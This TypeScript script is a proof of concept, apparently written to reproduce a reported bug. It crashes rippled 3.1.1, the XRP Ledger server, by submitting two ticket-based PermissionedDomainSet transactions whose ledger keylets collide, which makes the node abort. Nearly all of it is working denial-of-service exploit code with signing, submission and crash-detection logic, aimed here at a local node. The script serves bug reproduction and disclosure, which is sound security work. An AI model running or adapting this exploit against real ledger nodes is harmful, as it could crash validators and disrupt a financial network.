/**
 * pds-ticket-crash.ts
 *
 * Reproduces the PermissionedDomainSet + Ticket keylet-collision bug.
 * Confirmed vulnerable: rippled 3.1.1 (xrpllabsofficial/xrpld:latest as of 2026-02)
 *
 * Root cause: rippled computes the PermissionedDomain ledger-object keylet
 * using getFieldU32(sfSequence), which returns 0 for any ticket-based
 * transaction (sfSequence is always 0 when TicketSequence is used).
 * Two PermissionedDomainSet txs that use different tickets therefore map
 * to the same keylet → dirInsert: double insertion → LogicError → abort()
 * → exit 134.
 *
 * Usage:
 *   xrpl-up ticket create --count 2 --seed <SEED>   # create 2 tickets first
 *   npx tsx scripts/pds-ticket-crash.ts <SEED> <TICKET_SEQ_1> <TICKET_SEQ_2>
 *
 * Expected result:
 *   TX1 succeeds (tesSUCCESS)
 *   TX2 causes rippled to abort (connection drops / exit 134)
 */

import { Client, Wallet } from 'xrpl';

const LOCAL_WS = 'ws://localhost:6006';

const [seed, t1Arg, t2Arg] = process.argv.slice(2);

if (!seed || !t1Arg || !t2Arg) {
  console.error('Usage: npx tsx scripts/pds-ticket-crash.ts <seed> <ticketSeq1> <ticketSeq2>');
  process.exit(1);
}

const ticket1 = Number(t1Arg);
const ticket2 = Number(t2Arg);

if (isNaN(ticket1) || isNaN(ticket2)) {
  console.error('Ticket sequences must be numbers');
  process.exit(1);
}

const client = new Client(LOCAL_WS);
const wallet = Wallet.fromSeed(seed);

async function sendPDS(ticketSeq: number, label: string): Promise<string> {
  const tx = {
    TransactionType: 'PermissionedDomainSet',
    Account: wallet.address,
    // Sequence must be 0 when using TicketSequence
    Sequence: 0,
    TicketSequence: ticketSeq,
    // AcceptedCredentials: use self as issuer so the credential is well-formed.
    // The crash occurs in apply() before credential issuer existence is checked.
    AcceptedCredentials: [
      {
        Credential: {
          Issuer: wallet.address,
          CredentialType: '4B5943' // "KYC" in hex
        }
      }
    ]
  };

  // autofill fills Fee and LastLedgerSequence; do NOT let it overwrite Sequence
  const prepared = await client.autofill(tx as any);
  // autofill may reset Sequence — restore it to 0 (required for ticket txs)
  (prepared as any).Sequence = 0;

  console.log(`\n[${label}] Prepared TX:`, JSON.stringify(prepared, null, 2));

  const signed = wallet.sign(prepared as any);
  console.log(`\n[${label}] Submitting PermissionedDomainSet via ticket ${ticketSeq}...`);

  const result = await client.submitAndWait(signed.tx_blob);
  const outcome = (result.result.meta as any)?.TransactionResult ?? 'unknown';
  return outcome;
}

async function main() {
  console.log('Connecting to local rippled...');
  await client.connect();

  console.log(`Account : ${wallet.address}`);
  console.log(`Tickets : ${ticket1}, ${ticket2}`);

  // ── TX1: first domain creation via ticket1 ──────────────────────────────────
  let result1: string;
  try {
    result1 = await sendPDS(ticket1, 'TX1');
    console.log(`[TX1] Result: ${result1}`);
  } catch (err: any) {
    console.error('[TX1] Unexpected error:', err.message);
    await client.disconnect();
    process.exit(1);
  }

  if (result1 !== 'tesSUCCESS') {
    console.warn(`\n⚠  TX1 did not succeed (${result1}). Check amendment enablement.`);
    console.warn('   Run: xrpl-up amendment enable PermissionedDomains --local');
    await client.disconnect();
    process.exit(1);
  }

  // ── TX2: second domain creation via ticket2 — triggers the crash ────────────
  console.log('\n[TX2] Submitting second PermissionedDomainSet via ticket2...');
  console.log('      (rippled is expected to abort here — exit 134)');

  try {
    const result2 = await sendPDS(ticket2, 'TX2');
    console.log(`[TX2] Result: ${result2}`);
    console.warn('\n⚠  TX2 did NOT crash rippled. The bug may have been patched in this image.');
  } catch (err: any) {
    if (err.message?.includes('WebSocket') || err.message?.includes('disconnect') || err.message?.includes('Connection')) {
      console.log('\n✔  Connection lost after TX2 — rippled crashed (expected behaviour).');
      console.log('   Verify: docker inspect xrpl-up-local-rippled-1 --format \'{{.State.ExitCode}}\'');
      console.log('           Expected exit code: 134');
    } else {
      console.error('[TX2] Error:', err.message);
    }
  }

  try { await client.disconnect(); } catch { /* already gone */ }
}

main().catch(err => {
  console.error('Fatal:', err.message);
  process.exit(1);
});
